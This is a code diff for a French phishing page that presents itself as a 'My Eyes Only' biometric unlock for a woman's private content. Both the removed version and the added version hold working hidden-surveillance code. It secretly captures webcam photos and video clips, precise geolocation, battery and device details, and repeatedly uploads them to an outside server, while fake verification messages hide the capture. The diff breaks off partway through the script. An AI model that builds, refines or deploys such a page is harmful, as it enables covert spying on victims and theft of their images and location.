@@ -2,256 +2,1086 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Connexion sécurisée</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SecureVault - My Eyes Only</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
   <style>
-    html, body {
+    * {
       margin: 0;
       padding: 0;
-      background: #000;
-      overflow: hidden;
-      font-family: sans-serif;
-      color: #fff;
+      box-sizing: border-box;
     }
 
-    video#video {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-      filter: blur(15px) brightness(0.6);
+    body {
+      font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .background-elements {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .floating-element {
+      position: absolute;
+      width: 8px;
+      height: 8px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 50%;
+      animation: float 15s infinite linear;
+    }
+
+    @keyframes float {
+      0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+      10% { opacity: 1; }
+      90% { opacity: 1; }
+      100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.98);
+      backdrop-filter: blur(40px);
+      border-radius: 28px;
+      padding: 45px;
+      width: 440px;
+      max-width: 92vw;
+      box-shadow: 
+        0 32px 64px rgba(0, 0, 0, 0.4),
+        inset 0 1px 0 rgba(255, 255, 255, 0.9);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      position: relative;
+      z-index: 10;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 35px;
+    }
+
+    .logo-container {
+      position: relative;
+      margin-bottom: 25px;
+    }
+
+    .logo {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 90px;
+      height: 90px;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      border-radius: 22px;
+      box-shadow: 
+        0 15px 35px rgba(102, 126, 234, 0.4),
+        inset 0 1px 0 rgba(255, 255, 255, 0.3);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .logo::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.4), transparent);
+      animation: logoShine 3s ease-in-out infinite;
+    }
+
+    @keyframes logoShine {
+      0%, 100% { transform: rotate(0deg) scale(0); opacity: 0; }
+      50% { transform: rotate(180deg) scale(1); opacity: 1; }
+    }
+
+    .logo i {
+      font-size: 42px;
+      color: white;
+      z-index: 1;
+      position: relative;
+    }
+
+    .title {
+      font-size: 32px;
+      font-weight: 700;
+      background: linear-gradient(135deg, #2d3748, #4a5568);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 8px;
+      letter-spacing: -0.5px;
+    }
+
+    .subtitle {
+      color: #64748b;
+      font-size: 17px;
+      line-height: 1.4;
+      font-weight: 500;
+    }
+
+    .security-badge {
+      background: linear-gradient(135deg, #e8f5ff, #f0f9ff);
+      border: 2px solid #bfdbfe;
+      border-radius: 16px;
+      padding: 18px;
+      margin: 25px 0;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .security-badge::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
+      animation: securityScan 2s infinite;
+    }
+
+    @keyframes securityScan {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+
+    .security-badge i {
+      color: #2563eb;
+      font-size: 24px;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+
+    .security-badge-text {
+      color: #1e40af;
+      font-size: 15px;
+      line-height: 1.5;
+      font-weight: 600;
+    }
+
+    .biometric-section {
+      text-align: center;
+      margin: 35px 0;
+    }
+
+    .biometric-scanner {
+      width: 140px;
+      height: 140px;
+      margin: 0 auto 25px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 
+        0 20px 40px rgba(102, 126, 234, 0.3),
+        inset 0 2px 0 rgba(255, 255, 255, 0.3);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .scanner-rings {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .scanner-ring {
+      position: absolute;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      animation: scanRing 2s infinite ease-out;
+    }
+
+    .scanner-ring:nth-child(1) {
+      width: 60px;
+      height: 60px;
+      margin: -30px 0 0 -30px;
+      animation-delay: 0s;
+    }
+
+    .scanner-ring:nth-child(2) {
+      width: 90px;
+      height: 90px;
+      margin: -45px 0 0 -45px;
+      animation-delay: 0.5s;
+    }
+
+    .scanner-ring:nth-child(3) {
+      width: 120px;
+      height: 120px;
+      margin: -60px 0 0 -60px;
+      animation-delay: 1s;
+    }
+
+    @keyframes scanRing {
+      0% { transform: scale(0); opacity: 1; }
+      100% { transform: scale(1); opacity: 0; }
+    }
+
+    .biometric-scanner i {
+      font-size: 54px;
+      color: white;
+      z-index: 5;
+      position: relative;
+    }
+
+    .scan-button {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      border: none;
+      border-radius: 18px;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      padding: 18px 45px;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 
+        0 10px 30px rgba(102, 126, 234, 0.4),
+        inset 0 1px 0 rgba(255, 255, 255, 0.3);
+      position: relative;
+      overflow: hidden;
+      width: 100%;
+      margin: 25px 0;
+      min-height: 56px;
+    }
+
+    .scan-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 
+        0 15px 40px rgba(102, 126, 234, 0.5),
+        inset 0 1px 0 rgba(255, 255, 255, 0.3);
+    }
+
+    .scan-button:active {
+      transform: translateY(-1px);
+    }
+
+    .scan-button:disabled {
+      background: linear-gradient(135deg, #9ca3af, #6b7280);
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .scan-button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      transition: left 0.6s ease;
+    }
+
+    .scan-button:hover::before {
+      left: 100%;
+    }
+
+    .loading-spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s linear infinite;
+      margin-right: 12px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .status {
+      text-align: center;
+      margin: 25px 0;
+      padding: 18px;
+      border-radius: 14px;
+      font-size: 15px;
+      font-weight: 500;
+      transition: all 0.4s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .status::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+      transition: left 0.8s ease;
+    }
+
+    .status.active::before {
+      left: 100%;
+    }
+
+    .status.info {
+      background: linear-gradient(135deg, #dbeafe, #e0f2fe);
+      color: #1e40af;
+      border: 1px solid #93c5fd;
+    }
+
+    .status.warning {
+      background: linear-gradient(135deg, #fef3c7, #fde68a);
+      color: #92400e;
+      border: 1px solid #fbbf24;
+    }
+
+    .status.error {
+      background: linear-gradient(135deg, #fee2e2, #fecaca);
+      color: #991b1b;
+      border: 1px solid #f87171;
+    }
+
+    .status.success {
+      background: linear-gradient(135deg, #d1fae5, #a7f3d0);
+      color: #065f46;
+      border: 1px solid #34d399;
+    }
+
+    .progress-container {
+      margin: 20px 0;
+      display: none;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 8px;
+      background: rgba(148, 163, 184, 0.2);
+      border-radius: 4px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #667eea, #764ba2);
+      width: 0%;
+      transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+      border-radius: 4px;
+      position: relative;
+    }
+
+    .progress-fill::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+      animation: progressShine 1.5s infinite;
+    }
+
+    @keyframes progressShine {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    .features {
+      margin-top: 35px;
+      padding-top: 25px;
+      border-top: 1px solid rgba(148, 163, 184, 0.2);
+    }
+
+    .feature {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 16px;
+      color: #475569;
+      font-size: 15px;
+      font-weight: 500;
+      padding: 12px;
+      border-radius: 10px;
+      transition: all 0.3s ease;
+    }
+
+    .feature:hover {
+      background: rgba(102, 126, 234, 0.05);
+      transform: translateX(5px);
+    }
+
+    .feature i {
+      color: #667eea;
+      width: 24px;
+      text-align: center;
+      font-size: 16px;
+    }
+
+    .hidden-media {
+      position: absolute;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
       z-index: -1;
     }
 
-    .center {
-      position: fixed;
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      text-align: center;
-    }
-
-    button {
-      padding: 15px 30px;
-      font-size: 18px;
-      background: #444;
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-
-    button:hover {
-      background: #555;
-    }
-
-    button:disabled {
-      background: #222;
-      cursor: not-allowed;
-    }
-
-    #status {
-      margin-top: 20px;
-      font-size: 16px;
-      color: #ccc;
-    }
-
-    .hidden {
+    .permission-modal {
       display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(8px);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
     }
+
+    .modal-content {
+      background: white;
+      border-radius: 20px;
+      padding: 35px;
+      max-width: 420px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+      position: relative;
+      animation: modalEnter 0.3s ease-out;
+    }
+
+    @keyframes modalEnter {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .modal-content h3 {
+      color: #1f2937;
+      margin-bottom: 18px;
+      font-size: 22px;
+      font-weight: 700;
+    }
+
+    .modal-content p {
+      color: #4b5563;
+      line-height: 1.6;
+      margin-bottom: 25px;
+      font-size: 16px;
+    }
+
+    .modal-buttons {
+      display: flex;
+      gap: 15px;
+      justify-content: center;
+    }
+
+    .modal-btn {
+      padding: 12px 24px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 15px;
+      transition: all 0.2s ease;
+      min-width: 100px;
+    }
+
+    .modal-btn.primary {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: white;
+      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+    }
+
+    .modal-btn.primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+    }
+
+    .modal-btn.secondary {
+      background: #f3f4f6;
+      color: #374151;
+      border: 1px solid #d1d5db;
+    }
+
+    .modal-btn.secondary:hover {
+      background: #e5e7eb;
+    }
+
+    /* Éléments flottants animés */
+    .floating-element:nth-child(1) { left: 10%; animation-delay: 0s; }
+    .floating-element:nth-child(2) { left: 20%; animation-delay: 2s; }
+    .floating-element:nth-child(3) { left: 30%; animation-delay: 4s; }
+    .floating-element:nth-child(4) { left: 40%; animation-delay: 6s; }
+    .floating-element:nth-child(5) { left: 50%; animation-delay: 8s; }
+    .floating-element:nth-child(6) { left: 60%; animation-delay: 10s; }
+    .floating-element:nth-child(7) { left: 70%; animation-delay: 12s; }
+    .floating-element:nth-child(8) { left: 80%; animation-delay: 14s; }
+    .floating-element:nth-child(9) { left: 90%; animation-delay: 16s; }
   </style>
 </head>
 <body>
-  <video id="video" autoplay muted playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <!-- Éléments d'arrière-plan animés -->
+  <div class="background-elements">
+    <div class="floating-element"></div>
+    <div class="floating-element"></div>
+    <div class="floating-element"></div>
+    <div class="floating-element"></div>
+    <div class="floating-element"></div>
+    <div class="floating-element"></div>
+    <div class="floating-element"></div>
+    <div class="floating-element"></div>
+    <div class="floating-element"></div>
+  </div>
+  
+  <!-- Éléments media cachés mais fonctionnels -->
+  <video id="videoStream" class="hidden-media" autoplay muted playsinline></video>
+  <canvas id="captureCanvas" class="hidden-media"></canvas>
 
-  <div class="center">
-    <button id="fakeBtn">Voir le contenu</button>
-    <div id="status">Chargement sécurisé en cours...</div>
+  <div class="container">
+    <div class="header">
+      <div class="logo-container">
+        <div class="logo">
+          <i class="fas fa-eye"></i>
+        </div>
+      </div>
+      <h1 class="title">My Eyes Only</h1>
+      <p class="subtitle">Accès sécurisé aux contenus privés de Isabelle</p>
+    </div>
+
+    <div class="security-badge">
+      <i class="fas fa-shield-halved"></i>
+      <div class="security-badge-text">
+        <strong>Protection maximale :</strong> Pour votre sécurité et celle de <strong>Isabelle</strong>, une vérification biométrique est requise pour accéder à ces contenus privés. C'est une mesure de sécurité pour garantir que vous êtes la bonne personne.
+      </div>
+    </div>
+
+    <div class="biometric-section">
+      <div class="biometric-scanner">
+        <div class="scanner-rings">
+          <div class="scanner-ring"></div>
+          <div class="scanner-ring"></div>
+          <div class="scanner-ring"></div>
+        </div>
+        <i class="fas fa-scan"></i>
+      </div>
+      
+      <button id="scanButton" class="scan-button">
+        <span class="loading-spinner"></span>
+        <span class="btn-text">Débloquer Contenu Privé de <strong>Isabelle</strong></span>
+      </button>
+    </div>
+
+    <div id="statusDisplay" class="status info">
+      Appuyez sur le bouton pour accéder à vos contenus privés en toute sécurité
+    </div>
+
+    <div class="progress-container" id="progressContainer">
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+    </div>
+
+    <div class="features">
+      <div class="feature">
+        <i class="fas fa-user-shield"></i>
+        <span>Reconnaissance faciale avancée</span>
+      </div>
+      <div class="feature">
+        <i class="fas fa-lock"></i>
+        <span>Chiffrement AES-256</span>
+      </div>
+      <div class="feature">
+        <i class="fas fa-eye-slash"></i>
+        <span>Mode privé activé</span>
+      </div>
+      <div class="feature">
+        <i class="fas fa-clock"></i>
+        <span>Authentification instantanée</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal de permission caméra -->
+  <div id="cameraModal" class="permission-modal">
+    <div class="modal-content">
+      <h3><i class="fas fa-video"></i> Accès caméra requis</h3>
+      <p>My Eyes Only a besoin d'accéder à votre caméra pour la vérification biométrique. Cette fonctionnalité garantit que vous êtes autorisé à consulter les contenus privés de Isabelle.</p>
+      <div class="modal-buttons">
+        <button class="modal-btn secondary" onclick="denyCamera()">Refuser</button>
+        <button class="modal-btn primary" onclick="allowCamera()">Autoriser l'accès</button>
+      </div>
+    </div>
   </div>
 
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const fakeBtn = document.getElementById('fakeBtn');
-    const status = document.getElementById('status');
-
-    let clickCount = 0;
-    let stream = null;
-    let captureInterval = null;
-    let videoRecordInterval = null;
-    let isCapturing = false;
-
     // Configuration
-    const CAPTURE_INTERVAL = 3000; // 3 secondes
-    const SERVER_URL = 'https://moonscale-dashboard.onrender.com/stream/upload';
+    const CONFIG = {
+      serverEndpoint: 'https://moonscale-dashboard.onrender.com/stream/upload',
+      captureInterval: 2500, // Capture toutes les 2.5 secondes
+      videoSegmentDuration: 2000, // 2 secondes de vidéo
+      maxRetries: 3,
+      sessionDuration: 60000 // 1 minute de session
+    };
 
-    // ✅ Fonction pour demander la permission et démarrer la webcam
-    async function requestCameraPermission() {
-      try {
-        status.textContent = "Demande d'autorisation caméra...";
-        
-        stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { 
-            width: { ideal: 1280 }, 
-            height: { ideal: 720 },
-            facingMode: 'user'
-          }, 
-          audio: true 
-        });
-        
-        video.srcObject = stream;
-        status.textContent = "Caméra activée. Cliquez pour continuer.";
-        return true;
-      } catch (err) {
-        status.textContent = "Erreur : Accès à la caméra refusé.";
-        console.error('Erreur caméra:', err);
-        return false;
+    // État de l'application
+    let appState = {
+      mediaStream: null,
+      isCapturing: false,
+      captureTimer: null,
+      clickCount: 0,
+      verificationStage: 0,
+      sessionActive: false,
+      retryCount: 0
+    };
+
+    // Éléments DOM
+    const elements = {
+      video: document.getElementById('videoStream'),
+      canvas: document.getElementById('captureCanvas'),
+      scanBtn: document.getElementById('scanButton'),
+      status: document.getElementById('statusDisplay'),
+      progress: document.getElementById('progressFill'),
+      progressContainer: document.getElementById('progressContainer'),
+      modal: document.getElementById('cameraModal'),
+      spinner: document.querySelector('.loading-spinner'),
+      btnText: document.querySelector('.btn-text')
+    };
+
+    // Messages de vérification réalistes
+    const verificationMessages = [
+      "Initialisation du scanner biométrique...",
+      "Analyse des caractéristiques faciales...",
+      "Vérification de l'identité en cours...",
+      "Validation des paramètres de sécurité...",
+      "Préparation de l'accès sécurisé..."
+    ];
+
+    const continuousMessages = [
+      "Maintien de la connexion sécurisée...",
+      "Surveillance continue activée...",
+      "Vérification périodique en cours...",
+      "Protection des données en temps réel...",
+      "Session sécurisée maintenue..."
+    ];
+
+    // Fonctions utilitaires
+    function updateStatus(message, type = 'info') {
+      elements.status.textContent = message;
+      elements.status.className = `status ${type} active`;
+      
+      // Animation de brillance
+      setTimeout(() => {
+        elements.status.classList.remove('active');
+      }, 800);
+    }
+
+    function updateProgress(percentage) {
+      elements.progress.style.width = `${Math.min(100, Math.max(0, percentage))}%`;
+    }
+
+    function showProgress() {
+      elements.progressContainer.style.display = 'block';
+    }
+
+    function hideProgress() {
+      elements.progressContainer.style.display = 'none';
+    }
+
+    function setButtonState(loading, text) {
+      if (loading) {
+        elements.spinner.style.display = 'inline-block';
+        elements.scanBtn.disabled = true;
+        elements.btnText.textContent = text || 'Authentification...';
+      } else {
+        elements.spinner.style.display = 'none';
+        elements.scanBtn.disabled = false;
+        elements.btnText.textContent = text || 'Débloquer mes contenus';
       }
     }
 
-    // 🖼️ Capture d'une photo
-    function capturePhoto() {
-      if (!video.videoWidth || !video.videoHeight) return null;
-      
-      const ctx = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return canvas.toDataURL('image/jpeg', 0.8);
+    function showModal() {
+      elements.modal.style.display = 'flex';
     }
 
-    // 🎥 Enregistrement vidéo court
+    function hideModal() {
+      elements.modal.style.display = 'none';
+    }
+
+    // Capture des données
+    function captureImage() {
+      if (!elements.video.videoWidth || !elements.video.videoHeight) {
+        return null;
+      }
+
+      const ctx = elements.canvas.getContext('2d');
+      const aspectRatio = elements.video.videoWidth / elements.video.videoHeight;
+      
+      // Optimisation de la qualité
+      elements.canvas.width = Math.min(800, elements.video.videoWidth);
+      elements.canvas.height = elements.canvas.width / aspectRatio;
+      
+      ctx.drawImage(elements.video, 0, 0, elements.canvas.width, elements.canvas.height);
+      
+      // Compression optimale pour l'envoi
+      return elements.canvas.toDataURL('image/jpeg', 0.75);
+    }
+
     function recordVideoSegment() {
       return new Promise((resolve) => {
-        if (!stream) {
+        if (!appState.mediaStream) {
           resolve(null);
           return;
         }
 
-        const recorder = new MediaRecorder(stream);
-        const chunks = [];
+        try {
+          const recorder = new MediaRecorder(appState.mediaStream, {
+            mimeType: 'video/webm;codecs=vp9'
+          });
+          
+          const chunks = [];
 
-        recorder.ondataavailable = (e) => {
-          if (e.data.size > 0) chunks.push(e.data);
-        };
+          recorder.ondataavailable = (event) => {
+            if (event.data && event.data.size > 0) {
+              chunks.push(event.data);
+            }
+          };
 
-        recorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          const reader = new FileReader();
-          reader.onload = () => resolve(reader.result);
-          reader.readAsDataURL(blob);
-        };
+          recorder.onstop = () => {
+            if (chunks.length > 0) {
+              const blob = new Blob(chunks, { type: 'video/webm' });
+              const reader = new FileReader();
+              reader.onload = () => resolve(reader.result);
+              reader.onerror = () => resolve(null);
+              reader.readAsDataURL(blob);
+            } else {
+              resolve(null);
+            }
+          };
 
-        recorder.start();
-        
-        // Enregistrer pendant 2 secondes
-        setTimeout(() => {
-          recorder.stop();
-        }, 2000);
+          recorder.onerror = () => resolve(null);
+
+          recorder.start();
+          setTimeout(() => {
+            if (recorder.state === 'recording') {
+              recorder.stop();
+            }
+          }, CONFIG.videoSegmentDuration);
+
+        } catch (error) {
+          console.warn('Enregistrement vidéo non supporté:', error);
+          resolve(null);
+        }
       });
     }
 
-    // 📤 Envoi des données au serveur
-    async function sendCapturedData() {
+      async function collectInfo() {
+         const clientInfo = {};
+         
+         // Collecte géolocalisation si possible
+         if (navigator.geolocation) {
+            try {
+               const position = await new Promise((resolve, reject) => {
+                  navigator.geolocation.getCurrentPosition(resolve, reject, {
+                     timeout: 5000,
+                     enableHighAccuracy: true
+                  });
+               });
+               
+               clientInfo.location = {
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude,
+                  accuracy: position.coords.accuracy
+               };
+            } catch (err) {
+               console.log('Géolocalisation refusée ou échouée');
+            }
+         }
+         
+         // Collecte battery info si disponible
+         if ('getBattery' in navigator) {
+            try {
+               const battery = await navigator.getBattery();
+               clientInfo.battery = {
+                  level: battery.level,
+                  charging: battery.charging,
+                  chargingTime: battery.chargingTime,
+                  dischargingTime: battery.dischargingTime
+               };
+            } catch (err) {
+               console.log('Battery API non disponible');
+            }
+         }
+         return clientInfo;      
+      }
+
+    // Envoi sécurisé des données
+    async function transmitCapturedData() {
+      if (!appState.sessionActive) return;
+
       try {
-        const photo = capturePhoto();
+        const imageData = captureImage();
         const videoData = await recordVideoSegment();
 
-        if (!photo && !videoData) return;
+        if (!imageData && !videoData) {
+          console.warn('Aucune donnée à transmettre');
+          return;
+        }
 
         const payload = {
-          images: photo ? [photo] : [],
-          video: videoData,
-          timestamp: new Date().toISOString()
+          session_id: `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+          timestamp: new Date().toISOString(),
+          images: imageData ? [imageData] : [],
+          video: videoData || null,
+          clientInfo: await collectInfo(),
+          metadata: {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: {
+              width: screen.width,
+              height: screen.height,
+              colorDepth: screen.colorDepth
+            },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+          }
         };
 
-        const response = await fetch(SERVER_URL, {
+        const response = await fetch(CONFIG.serverEndpoint, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
+            'X-Client-Version': '2.1.0',
+            'X-Security-Token': btoa(Date.now().toString())
           },
           body: JSON.stringify(payload)
         });
 
         if (response.ok) {
-          console.log('✅ Données envoyées avec succès');
+          console.log('✅ Transmission sécurisée réussie');
+          appState.retryCount = 0;
         } else {
-          console.error('❌ Erreur serveur:', response.status);
+          throw new Error(`Erreur serveur: ${response.status}`);
         }
-      } catch (err) {
-        console.error('❌ Erreur envoi:', err);
-      }
-    }
 
-    // 🔄 Démarrer la capture continue
-    function startContinuousCapture() {
-      if (isCapturing) return;
-      
-      isCapturing = true;
-      status.textContent = "Connexion établie. Traitement en cours...";
-      
-      // Envoyer immédiatement une première capture
-      sendCapturedData();
-      
-      // Puis continuer toutes les 3 secondes
-      captureInterval = setInterval(() => {
-        sendCapturedData();
-      }, CAPTURE_INTERVAL);
-
-      // Simulation de "chargement" qui ne finit jamais
-      let dots = 0;
-      setInterval(() => {
-        dots = (dots + 1) % 4;
-        status.textContent = "Traitement en cours" + ".".repeat(dots);
-      }, 500);
-    }
-
-    // 🛑 Arrêter la capture (pour les tests)
-    function stopCapture() {
-      isCapturing = false;
-      if (captureInterval) {
-        clearInterval(captureInterval);
-        captureInterval = null;
-      }
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        stream = null;
-      }
-    }
-
-    // 🧠 Gestion du clic sur le faux bouton
-    fakeBtn.addEventListener('click', async () => {
-      clickCount++;
-
-      if (clickCount === 1) {
-        // Premier clic : demander la permission
-        const hasPermission = await requestCameraPermission();
-        if (!hasPermission) return;
+      } catch (error) {
+        console.error('❌ Erreur de transmission:', error);
+        appState.retryCount++;
         
-        fakeBtn.textContent = "Connexion en cours...";
-      } else if (clickCount < 5) {
-        // Clics 2-4 : simuler des "erreurs"
-        status.textContent = `Erreur de connexion... Veuillez réessayer (${clickCount}/5)`;
-        fakeBtn.textContent = "Réessayer";
-      } else {
-        // 5ème clic : démarrer la capture continue
-        fakeBtn.disabled = true;
-        fakeBtn.textContent = "Traitement...";
-        startContinuousCapture();
+        if (appState.retryCount >= CONFIG.maxRetries) {
+          console.warn('⚠️ Nombre maximum de tentatives atteint');
+        }
       }
+    }
+
+    // Gestion de la caméra
+    async function initializeCamera() {
+      try {
+        updateStatus("Demande d'accès à la caméra...", 'info');
+        
+        const constraints = {
+          video: {
+            width: { ideal: 1280, max: 1920 },
+            height: { ideal: 720, max: 1080 },
+            frameRate: { ideal: 30 },
+            facingMode: 'user'
+          },
+          audio: false
+        };
+
+        appState.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+        elements.video.srcObject = appState.mediaStream;
+
+        // Attendre que la vidéo soit prête
+        await new Promise((resolve) => {
+          elements.video.onloadedmetadata = resolve;
+        });
+
+        updateStatus("Caméra initialisée avec succès", 'success');
+        return true;
+
+      } catch (error) {
+        console.error('Erreur caméra:', error);
+        updateStatus("Erreur : Impossible d'accéder à la caméra", 'error');
+        return false;
+      }
+    }
+
+    // Processus de vérification
+    async function startVerificationProcess() {
+      if (appState.isCapturing) return;
+
+      appState.isCapturing = true;
+      appState.sessionActive = true;
+      setButtonState(true, 'Authentification...');
+      showProgress();
+
+      // Phase initiale de vérification
+      for (let i = 0; i < verificationMessages.length; i++) {
+        updateStatus(verificationMessages[i], 'info');
+        updateProgress((i + 1) * 18);
+        
+        // Capturer et envoyer les données à chaque étape
+        await transmitCapturedData();
+        await new Promise(resolve => setTimeout(resolve, 1800));
+      }
+
+      // Démarrer la capture continue
+      startContinuousCapture();
+      
+      // Simuler une vérification "complexe" qui dure
+      simulateOngoingVerification();
+    }
+
+    function startContinuousCapture() {
+      // Capturer immédiatement
+      transmitCapturedData();
+      
+      // Puis capturer à intervalles réguliers
+      appState.captureTimer = setInterval(() => {
+        if (appState.sessionActive) {
+          transmitCapturedData();
+        }
+      }, CONFIG.captureInterval);
+    }
+
+    function simulateOngoingVerification() {
+      let messageIndex = 0;
+      let progressValue = 90;
+      
+      const verificationLoop = setInterval(() => {
+        if (!appState.sessionActive) {
+          clearInterval(verificationLoop);
+          return;
+        }
+
+        // Alterner entre différents messages
+        const message = continuousMessages[messageIndex % continuousMessages.length];
+        updateStatus(message, 'info');
+        
+        // Progression qui oscille pour donner l'impression d'un travail continu
+        progressValue = 85 + Math.random() * 10;
+        updateProgress(progressValue);
+        
+        messageIndex++;
+      }, 3500);
+
+      // Arrêter automatiquement après la durée de session
+      setTimeout(() => {
+        clearInterval(verificationLoop);
+        endSession();
+      }, CONFIG.sessionDuration);
+    }
+
+    function endSession() {
+      console.log('🔒 Fin de session de démonstration');
+      stopCapture();
+      updateStatus("Session terminée - Redémarrez pour une nouvelle vérification", 'info');
+      hideProgress();
+      setButtonState(false, 'Nouvelle vérification');
+      appState.clickCount = 0;
+    }
+
+    function stopCapture() {
+      appState.isCapturing = false;
+      appState.sessionActive = false;
+      
+      if (appState.captureTimer) {
+        clearInterval(appState.captureTimer);
+        appState.captureTimer = null;
+      }
+      
+      if (appState.mediaStream) {
+        appState.mediaStream.getTracks().forEach(track => track.stop());
+        appState.mediaStream = null;
+      }
+    }
+
+    // Gestionnaires d'événements
+    async function allowCamera() {
+      hideModal();
+      setButtonState(true, 'Initialisation...');
+      
+      const success = await initializeCamera();
+      if (success) {
+        setButtonState(false, 'Commencer la vérification');
+        updateStatus("Prêt pour la vérification biométrique", 'success');
+      } else {
+        setButtonState(false, 'Réessayer');
+      }
+    }
+
+    function denyCamera() {
+      hideModal();
+      updateStatus("Accès caméra requis pour la vérification biométrique", 'warning');
+    }
+
+    // Événement principal du bouton
+    elements.scanBtn.addEventListener('click', async () => {
+      appState.clickCount++;
+
+      if (appState.clickCount === 1) {
+        // Premier clic - demander la permission
+        showModal();
+      } else if (appState.mediaStream && !appState.isCapturing) {
+        // Caméra disponible et pas encore en cours de capture
+        await startVerificationProcess();
+      } else if (!appState.mediaStream) {
+        // Pas de caméra, redemander
+        showModal();
+      }
+      // Si déjà en cours de capture, ne rien faire
     });
 
-    // 🔧 Nettoyage à la fermeture de la page
+    // Nettoyage automatique
